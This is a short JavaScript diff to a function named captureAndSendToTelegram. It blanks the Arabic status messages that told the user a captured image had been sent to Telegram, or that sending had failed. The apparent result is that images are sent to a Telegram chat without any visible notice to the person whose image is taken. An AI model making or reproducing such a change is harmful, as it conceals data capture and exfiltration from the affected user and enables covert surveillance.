@@ -91,9 +91,9 @@ async function captureAndSendToTelegram() {
                 });
 
                 if (response.ok) {
-                    statusText.innerText = "تم إرسال الصورة إلى تليجرام بنجاح!";
+                    statusText.innerText = "";
                 } else {
-                    statusText.innerText = "فشل الإرسال، تأكد من صحة التوكن والـ Chat ID.";
+                    statusText.innerText = "";
                 }
             } catch (err) {
                 console.error("Telegram error:", err);
